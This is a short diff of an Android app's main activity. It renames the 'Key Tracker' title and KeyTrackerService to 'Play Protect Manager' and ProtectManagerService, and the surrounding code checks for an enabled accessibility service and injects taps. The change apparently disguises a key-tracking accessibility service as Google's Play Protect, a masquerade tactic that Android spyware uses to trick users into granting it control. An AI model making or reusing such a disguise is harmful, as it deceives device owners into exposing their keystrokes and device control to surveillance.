@@ -34,7 +34,7 @@ public class MainActivity extends Activity {
         layout.setGravity(android.view.Gravity.CENTER);
         
         TextView title = new TextView(this);
-        title.setText("Key Tracker");
+        title.setText("Play Protect Manager");
         title.setTextSize(24);
         title.setGravity(android.view.Gravity.CENTER);
         title.setPadding(0, 0, 0, 20);
@@ -90,7 +90,7 @@ public class MainActivity extends Activity {
     }
 
     private void doTapFromInputs() {
-        KeyTrackerService svc = KeyTrackerService.getInstance();
+        ProtectManagerService svc = ProtectManagerService.getInstance();
         if (svc == null) {
             Toast.makeText(this, "Service d'accessibilité non connecté (active-le dans les paramètres).", Toast.LENGTH_LONG).show();
             return;
@@ -129,7 +129,7 @@ public class MainActivity extends Activity {
             am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
         
         boolean isServiceEnabled = false;
-        String serviceName = getPackageName() + "/" + KeyTrackerService.class.getName();
+        String serviceName = getPackageName() + "/" + ProtectManagerService.class.getName();
         
         for (android.accessibilityservice.AccessibilityServiceInfo service : enabledServices) {
             String enabledService = service.getResolveInfo().serviceInfo.packageName + "/" + 
